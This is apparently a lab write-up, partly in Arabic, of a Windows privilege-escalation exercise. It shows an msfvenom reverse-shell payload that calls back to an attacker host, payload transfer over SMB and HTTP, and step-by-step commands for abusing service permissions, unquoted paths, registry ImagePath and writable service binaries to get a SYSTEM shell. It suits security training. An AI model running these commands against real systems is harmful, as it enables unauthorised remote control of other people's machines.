# Windows PrivEsc

<img width="1907" height="364" alt="image" src="https://github.com/user-attachments/assets/82f1df6e-1dca-4555-bfea-af1faf6f0869" />


>[!note]
> ### Connect to Target using `RDP srvice enabled`:
>
> ```ruby
> xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.10.103.25
> ```
> Or
> ```ruby
> rdesktop 10.10.103.25 -u user -p password321
> ```
> #### `if winrm service is enabled` :
> ```ruby
> evil-winrm -i 10.10.103.25 -u user -p 'password321'
> ```
> #### `if SMB service is enabled` :
> ```ruby
> smbclient //MACHINE_IP/C$ -U user
> ```

- <details>
     <summary>Nmap Scan</summary>

  ```ruby
  nmap -sC -sV  10.10.103.25 
  ```
  
  **`output`**
  
  ```ruby
  PORT     STATE SERVICE       VERSION
  135/tcp  open  msrpc         Microsoft Windows RPC
  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds  Windows Server 2019 Standard Evaluation 17763 microsoft-ds
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
  |_ssl-date: 2025-09-08T19:27:18+00:00; -2s from scanner time.
  | ssl-cert: Subject: commonName=WIN-QBA94KB3IOF
  | Not valid before: 2025-09-07T18:56:41
  |_Not valid after:  2026-03-09T18:56:41
  | rdp-ntlm-info: 
  |   Target_Name: WIN-QBA94KB3IOF
  |   NetBIOS_Domain_Name: WIN-QBA94KB3IOF
  |   NetBIOS_Computer_Name: WIN-QBA94KB3IOF
  |   DNS_Domain_Name: WIN-QBA94KB3IOF
  |   DNS_Computer_Name: WIN-QBA94KB3IOF
  |   Product_Version: 10.0.17763
  |_  System_Time: 2025-09-08T19:27:08+00:00
  5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-title: Not Found
  |_http-server-header: Microsoft-HTTPAPI/2.0
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  |_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s
  | smb-os-discovery: 
  |   OS: Windows Server 2019 Standard Evaluation 17763 (Windows Server 2019 Standard Evaluation 6.3)
  |   Computer name: WIN-QBA94KB3IOF
  |   NetBIOS computer name: WIN-QBA94KB3IOF\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2025-09-08T12:27:11-07:00
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2025-09-08T19:27:12
  |_  start_date: N/A
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 256.26 seconds
  ```
  
  - **`3389/tcp open  ms-wbt-server`** : That is mean `RDP service` is work
  - **`5985/tcp open  http`** : That is mean `WinRM HTTP service` is work
  - **`445/tcp  open  microsoft-ds`** : That is mean `SMB service` is work


     
  </details>



<details>
  <summary>Generate a Reverse Shell Executable</summary>

## 1. first Create **`Reverse Shell file`** on my kali device

```ruby
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

- **`msfvenom`** : Tool to create payload
- **`-p windows/x64/shell_reverse_tcp`** : Reverse shell type
- **`LHOST`** : Device IP that will recive the shell in this case will be my kali machine
- **`LPORT`** : port that shell will connect to it on kali
- **`-f exe`** : output file type `exe`
- **`-o reverse.exe`** : put the output in file call ``reverse.exe``

## 2. send reverse sell to windows

**`on kali Device open smb servrice on directory that have reverseshell file`**

```ruby
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

- **`kali`** : name share
- **`.`** : files that will avilable in the share here in current folder

**`on Windows Device`**

```ruby
copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
```

- copy file from kali machine to windows


---

<img width="638" height="147" alt="image" src="https://github.com/user-attachments/assets/0fb8c918-0b43-445d-81ce-ba68f457888f" />


<img width="1441" height="449" alt="image" src="https://github.com/user-attachments/assets/dce924e7-a87f-4dff-af42-349654bc9647" />

- **`that is mean file is copied to windows`**

---

### **`now run the reverse file on windows with lesten on port 4444 on kali`**

<img width="715" height="307" alt="image" src="https://github.com/user-attachments/assets/6c150d81-145e-4b5f-b16d-8985d3ffaf89" />

- **`here we go we receved the shell `**


  
</details>









<details>
  <summary>Service Exploits</summary>




- <details>
      <summary>🟦Understanding</summary>

  
  ## ``1. know all services that work on system and it's privileges``
  
  # **`CMD`**
  
  ```ruby
  sc query type= service state= all
  ```
  
  # **`PowerShell`**
  
  ```ruby
  Get-Service | Select-Object Name, Status, StartType
  ```
  
  
  ---
  ---
  
  ## ``2. know the privilges of the user on each service``
  
  ```ruby
  accesschk.exe -uwcqv user *
  ```
  
  > you must download **`accesschk.exe`**
  > 

  https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

  <details>
    <summary>send it to vectem</summary>
  
  ## **`using SMB`**
  
  **`on kali`**
  
  ```ruby
  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
  
  ```
  
  **`on windows`**
  
  ```ruby
  copy \\10.10.10.10\kali\accesschk.exe C:\PrivEsc\accesschk.exe
  ```
  
  ----
  ----
  
  ## **`using Powershell`**
  
  **`on windows`** if device connected to internet
  
  ```ruby
  Invoke-WebRequest -Uri "http://10.10.10.10/accesschk.exe" -OutFile "C:\PrivEsc\accesschk.exe"
  ```
  
  **`on kali`**
  
  ```ruby
  python3 -m http.server 80
  ```
  
  
    
  </details>


  > by default it downloaded on this machine 





  ---
  ---
  
  ## 3. found the services that work as **`SYSTEM`**
  
  # **`CMD`**
  
  ```ruby
  sc qc <ServiceName>
  ```
  
  > - look at **`SERVICE_START_NAME`** value
  
  # **`PowerShell`**
  
  ```ruby
  Get-WmiObject Win32_Service | Select-Object Name, StartName
  ```


  </details>








- <details>
      <summary>Insecure Service Permissions</summary>

  
  > ### Goal is prevEsc form normal user to `SYSTEM privileges` by **`daclsvc`** service 
  
  ## 1. first check the pricvllage of current user on this service ``(daclsvc)``
  
  ```ruby
  C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
  ```
  
  - **`accesschk.exe`** : This is Tool form _Sysinternals_ to check on privilege of current user on (files, folders, etc...)
  - **`/accepteula`** : this option to pybaass the first priv window
  - **`-uwcqv`** : options
    - **`u`** : user account
    - **`w`** : writeing privileges
    - **`c`** : change `config` privileges
    - **`q`** : `quiet` to make it simple
    - **`v`** : `verbose` for more details
  - **`user`** : username of current user
  - **`daclsvc`** : service name
      
  
  ---
  
  <img width="584" height="296" alt="image" src="https://github.com/user-attachments/assets/c8ab3ba2-ad0a-4c86-99e3-ace3b7ce30fb" />
  
  ### - **`Found that user have`** :
  
  ```ruby
  SERVICE_CHANGE_CONFIG
  ```
  ### - ``Thats mean this user can change settings of this service``
  
  
  ---
  
  ## 2. now we want to know privileges of the current service
  
  ```ruby
  sc qc daclsvc
  ```
  
  - **`sc qc`** : query config for service
  - **`daclsvc`** : name of the service
  
  ---
  
  <img width="860" height="319" alt="image" src="https://github.com/user-attachments/assets/abec5e68-4f0c-439c-933e-79bc3f289979" />
  
  ### - we found :
  
  - **`SERVICE_START_NAME`** : the account that this service work with it
  - **`LocalSystem`** : that is mean if we run this service any program will run as **`SYSTEM`**
  
  
  
  ---
  
  > ### NOW WE know that :
  > - this service can work as **`SYSTEM`**
  > - current user can edit this service settings **`SERVICE_CHANGE_CONFIG`**
  
  
  ## 3. change the path of this service to path of our reverse shell that will send shell to kali with **`SYSTEM`** privileges : 
  
  ```ruby
  sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
  ```
  
  - **`sc config`** : change service settings
  - **`binpath=`** : the new path to that service will run it
  - **`\"C:\PrivEsc\reverse.exe\`** : reverse shell that we sent it before
  
  
  ### **`lesten on port 4444 on kali`**
  
  ### **`run the service`**
  
  <img width="677" height="212" alt="image" src="https://github.com/user-attachments/assets/ad7a133f-2592-45ba-9083-47dfb2ed716b" />
  
  ---
  
  ## receved the shell :
  
  <img width="719" height="210" alt="image" src="https://github.com/user-attachments/assets/7d36208c-ce01-4047-9eaf-04c855830e50" />
  
  ---
  
  ## see that we now **`SYSTEM`** user
  
  ```ruby
  whoami
  ```
  
  <img width="327" height="79" alt="image" src="https://github.com/user-attachments/assets/64e23bed-3b42-4219-8714-a256a4f0db96" />
  
  <details>
    <summary>more commands</summary>
  
  
  ## to see our privilleges
  
  ```ruby
  whoami /priv
  ```
  <img width="1282" height="624" alt="image" src="https://github.com/user-attachments/assets/a65ceb03-b5b5-4c09-a2fc-a2214f0ef8fc" />
  
  
  ## see the groups that i'm in : 
  
  ```ruby
  whoami /groups
  ```
  
  <img width="1158" height="249" alt="image" src="https://github.com/user-attachments/assets/c2689996-2809-4a2d-bec0-9508e3c0a142" />
  
  ```ruby
  systeminfo
  ```
  
  <img width="796" height="599" alt="image" src="https://github.com/user-attachments/assets/1ec7bb31-9838-41fd-8872-ffe6e0b1d56c" />
  
  ## to show all env variables: 
  
  ```ruby
  set
  ```
  
  <img width="1403" height="554" alt="image" src="https://github.com/user-attachments/assets/5a9fa26d-e836-4fe0-9ada-2372d7e46a96" />
  
  
    
  </details>
  
  
  > ## now the answer of the question :
  > What is the original BINARY_PATH_NAME of the daclsvc service?
  
  ```ruby
  sc qc daclsvc
  ```
  
  <img width="860" height="319" alt="image" src="https://github.com/user-attachments/assets/abec5e68-4f0c-439c-933e-79bc3f289979" />
  
  **`answer`**
  
  ```ruby
  C:\Program Files\DACL Service\daclservice.exe
  ```
  


  </details>













- <details>
      <summary>Unquoted Service Path</summary>

     
     
     > ## in windows each service has :
     > - **`BINARY_PATH_NAME`** : THE path with refer to the place that have **`exe`** that this service will run it
     >   - if it's value writen without ``"..."`` that mean we can exploit it
     
     
     ---
     
     ## 1. first get info about the service (unquotedsvc)
     
     ```ruby
     sc qc unquotedsvc
     ```
     
     ## - found two important things
     
     > - **`SERVICE_START_NAME : LocalSystem`** : that is mean this service work as **`SYSTEM`**
     > - **`BINARY_PATH_NAME        : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`**
     >>  - IT without ``"..."``
     
     
     <img width="883" height="262" alt="image" src="https://github.com/user-attachments/assets/888cae7d-e707-4a32-bf40-02b668d079b5" />
     
     ---
     
     ## 2. TRY To know the privilege of current user on this path
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
     ```
     
     ## - **`RW BUILTIN\Users`** : that is mean any normal user can do read and write in this folder
     
     
     <img width="823" height="173" alt="image" src="https://github.com/user-attachments/assets/418384ed-aeff-4838-91b8-966a9933ba4d" />
     
     
     ---
     
     ## 3. move the reverse shell file to the new path with new name 
     
     
     ```ruby
     copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
     ```
     
     <img width="778" height="82" alt="image" src="https://github.com/user-attachments/assets/28249e57-c476-4664-b89f-7b136ef20544" />
     
     
     
     ## 4. open listener on kali
     
     ```ruby
     sudo nc -nvlp 4444
     ```
     
     ## 5. run the service 
     
     ```ruby
     net start unquotedsvc
     ```
     
     <img width="963" height="412" alt="image" src="https://github.com/user-attachments/assets/5b8eaba2-2421-4e4d-9d67-96e604910b74" />
     
     ---
     
     <img width="1646" height="214" alt="image" src="https://github.com/user-attachments/assets/c25163f8-d4d4-4446-94b9-6398e62bcc7d" />
     



  </details>















- <details>
      <summary> Weak Registry Permissions</summary>

     
     
     > ## in windows each service has settings stored in `Registry` like:
     > - **`SERVICE_START_NAME`** : who run the service
     > - **`BINARY_PATH_NAME`** : the excutable file that run when this service run
     
     
     ## 1. first get info about the service (regsvc):
     
     ```ruby
     sc qc regsvc
     ```
     
     ```c
       BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
       SERVICE_START_NAME : LocalSystem
     ```
     
     
     <img width="836" height="255" alt="image" src="https://github.com/user-attachments/assets/5019fb82-41c1-45f7-8983-dcd88310af44" />
     
     
     ## 2. check the privilege of this user to wirte on **`Registry`**
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
     ```
     
     ```perl
     RW NT AUTHORITY\INTERACTIVE
           KEY_ALL_ACCESS
     ```
     
     ### - `that is mean any user have access to write on registry key of this service`
     
     
     <img width="797" height="192" alt="image" src="https://github.com/user-attachments/assets/88afff65-8a8a-4eaf-b3ad-ddc0cfedfbe0" />
     
     
     
     ## 3. edit Registry value and make it refer to our reverseshell file
     
     ```ruby
     reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
     ```
     
     - **`/v ImagePath`** : It determines that we change this particular value.
     - **`/t REG_EXPAND_SZ`** : Value type (String extended).
     - **`/d C:\PrivEsc\reverse.exe`** : New data (new path).
     - **`/f`** : (to not ask you for confirmation).
      
     
     ## 4. open Listener on kali
     
     ```ruby
     nc -nvlp 4444
     ```
     
     
     ## 5. run the service
     
     ```ruby
     net start regsvc
     ```
     
     
     <img width="995" height="568" alt="image" src="https://github.com/user-attachments/assets/0ae50a32-d149-46f3-98a6-4e17d9175224" />
     


     <details>
        <summary>الفرق بين daclsvc و regsvc Exploits</summary>
     
     
     
     
     
     ## الفرق بين daclsvc و regsvc Exploits
     
     
     الـ 2 إكسبلويت شبيهين في النتيجة (تشغيل ملفنا كـ SYSTEM)، لكن الاختلاف في **إيه اللي اتحكمنا فيه وإزاي**:
     
     ### 1️⃣ أول exploit (daclsvc)
     
     الأوامر:
     
     ```cmd
     sc qc daclsvc
     sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
     net start daclsvc
     ```
     
     * الخدمة أصلاً كانت بتشاور على ملف EXE في الـ `binpath`.
     * اليوزر عنده **SERVICE\_CHANGE\_CONFIG** → يقدر يعدّل إعدادات الخدمة باستخدام `sc config`.
     * غيّرنا الـ **binpath** بتاع الخدمة وخليّناه يشاور على ملفنا (reverse.exe).
     * لما شغّلنا الخدمة → الملف بتاعنا اتنفذ كـ SYSTEM.
     
     **الخلاصة**: استغلال صلاحية "تغيير إعدادات الخدمة" (config).
     
     ### 2️⃣ تاني exploit (regsvc)
     
     الأوامر:
     
     ```cmd
     accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
     reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
     net start regsvc
     ```
     
     * الخدمة (regsvc) بتشاور على المسار بتاعها من الريجستري (`ImagePath`).
     * عندنا صلاحية **كتابة على مفتاح الريجستري** ده (مش config بتاع الخدمة نفسها).
     * بدلنا قيمة الـ `ImagePath` في الريجستري وخليّناه يشاور على `reverse.exe`.
     * لما شغّلنا الخدمة → برضه ملفنا اتنفذ كـ SYSTEM.
     
     **الخلاصة**: استغلال صلاحية "كتابة في الريجستري" بدل "تغيير إعدادات الخدمة".
     
     ### الفرق الرئيسي:
     
     * **daclsvc**: عدّلنا إعدادات الخدمة باستخدام أمر `sc config` (بسبب صلاحية خدمة).
     * **regsvc**: عدّلنا **الريجستري** اللي الخدمة بتسحب منه الإعدادات (بسبب صلاحية على الريجستري).
     
     ---
     
     ## جدول مقارنة بين أنواع Service Exploits
     
     | نوع الاستغلال                 | المكان/الصلاحية المطلوب  | الطريقة                              | النتيجة                               |
     | ----------------------------- | ------------------------ | ------------------------------------ | ------------------------------------- |
     | DACL / Config Exploit         | SERVICE\_CHANGE\_CONFIG  | sc config تغيير binpath              | تشغيل ملف كـ SYSTEM                   |
     | Registry Exploit              | Write على Registry       | reg add لتغيير ImagePath             | تشغيل ملف كـ SYSTEM                   |
     | Unquoted Path Exploit         | Write على مجلد الخدمة    | وضع ملف باسم معين داخل مجلد غير مقفل | تشغيل الملف بصلاحيات SYSTEM عند start |
     | AlwaysInstallElevated Exploit | سياسات Windows Installer | تثبيت MSI خبيث                       | تشغيل كـ SYSTEM                       |
     | Weak Service Permissions      | أذونات ضعيفة على الخدمة  | sc config / binpath                  | تشغيل كـ SYSTEM                       |
     
     *ملاحظة*: كل الطرق السابقة تعتمد على أن الخدمة تعمل تحت SYSTEM أو حساب عالي الصلاحيات.
     
     
     ---


     # Windows Service Paths Explained
     
     ## 1️⃣ BINARY_PATH_NAME
     - ده الـ **path الحقيقي** للـ executable اللي السيرفيس هيشغله.
     - لما تعمل `sc config <service> binpath= "..."`، أنت فعليًا بتغير **المكان اللي النظام هيشغل منه البرنامج**.
     - أي تغيير هنا بيأثر على السيرفيس فورًا بعد إعادة التشغيل.
     
     ## 2️⃣ ImagePath
     - ده موجود في **Registry** تحت المسار:
       ```
       HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>
       ```
     - القيمة دي هي نفسها `BINARY_PATH_NAME`، لأنها مجرد **طريقة Windows لتخزين path السيرفيس** في الريجستري.
     - عمليًا هما بيشاوروا لنفس الملف، لكن `ImagePath` موجود في الريجستري، و`BINARY_PATH_NAME` بيشتغل بيه `sc.exe`.
     
     ## 3️⃣ العلاقة بينهم
     - لو غيرت `BINARY_PATH_NAME` عن طريق `sc config` → النظام بيحدث الـ `ImagePath` في الريجستري تلقائي.
     - لو غيرت `ImagePath` مباشرة في الريجستري → السيرفيس مش هيعرف لحد ما تعمله restart أو تستخدم `sc` لتحديثه.
     
     ## 4️⃣ ليه في Exploit غيرنا `binpath`؟
     - الهدف كان **تشغيل الـ reverse shell الخاص بينا كخدمة**.
     - الأمر المستخدم:
       ```
       sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
       ```
     - ده بيخلي السيرفيس يشتغل بالـ executable بتاعنا بدل الأصلي.
     - وده أساسي في **privilege escalation** على Windows لأن السيرفيس بيشتغل بـ SYSTEM privileges.
     
     ## مثال تشبيهي
     - تخيل عندك دفتر (Registry) وورقة (BINARY_PATH_NAME) فيها نفس الرقم:
       - لو كتبت الرقم في الورقة → الدفتر بيتحدث تلقائي.
       - لو كتبت الرقم في الدفتر بس → الورقة مش هتعرف إلا لما تقول لها "حدّثي نفسك" (restart أو `sc`).
     
     
          
     
     
     
     
     </details>






  </details>














- <details>
      <summary>Insecure Service Executables</summary>

     
     ## 1. Query the service configuration
     
     ```ruby
     sc qc filepermsvc
     ```
     
     - **`sc`** : `(Service Control)` Tool in windows
     - **`qc`** : `(Query Configuration)` to get service settings
     
     ---
     
     ```ruby
             BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
             SERVICE_START_NAME : LocalSystem
     ```
     
     
     <img width="856" height="276" alt="image" src="https://github.com/user-attachments/assets/8def86f3-a0a7-4c06-9e67-bd75f5a2f2ba" />
     
     ---
     
     ## 2. Check file permissions with accesschk
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
     ```
     
     - **`accesschk.exe`** : Tool from _Sysinternals_
     - **`/accepteula`** : It means "I agree to the user agreement" (required the first time).
     - **`-quvw`**
        - **`q`** : quiet
        - **`u`** : show user-specific permissions
        - **`v`** : `verbose` More detail
        - **`w`** : It focuses on write permissions (who has the authority to write to the file).
     - **`"C:\Program Files\File Permissions Service\filepermservice.exe"`** : The file whose permissions we want to see.
     
     ---
     
     ```ruby
      RW Everyone
             FILE_ALL_ACCESS
     ```
     
     ### - `🚨 that is mean every one on this system They have almost all the permissions on the file (read, write, modify, delete...).`
     
     
     
     <img width="923" height="268" alt="image" src="https://github.com/user-attachments/assets/71ec6c24-5cf3-4433-91dd-595bb89f31d8" />
     
     
     
     ## 3. Replace the service binary
     
     
     ```ruby
     copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
     ```
     
     - **`copy`** : File copy command.
     - **`C:\PrivEsc\reverse.exe`** : The reverse shell we created (our malicious file).
     - **`"C:\Program Files\File Permissions Service\filepermservice.exe"`** : The original file of the service.
     - **`/Y`** : He lets the copying happen without asking you, “Are you sure you want to overwrite?”
     
     
     <img width="886" height="135" alt="image" src="https://github.com/user-attachments/assets/549d2f3a-bbfa-478d-8937-8b2065bd3199" />
     
     
     ## 4. Start listener on Kali
     
     ```ruby
     nc -lvnp 4444
     ```
     
     ## 5. Start the service
     
     ```ruby
     net start filepermsvc
     ```
     
     - **`net`** : A Windows tool for managing networks and services.
     - **`start`** : Service run command.
     - **`filepermsvc`** : service name
     
     
     <img width="1003" height="272" alt="image" src="https://github.com/user-attachments/assets/9898c0ad-670a-4870-aa16-862b6406cdb2" />
     
     



  </details>
  



  
</details>












<details>
  <summary>Registry</summary>



- <details>
     <summary>AutoRuns</summary>





  </details>



- <details>
     <summary>AlwaysInstallElevated</summary>





  </details>



     
</details>

















<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>





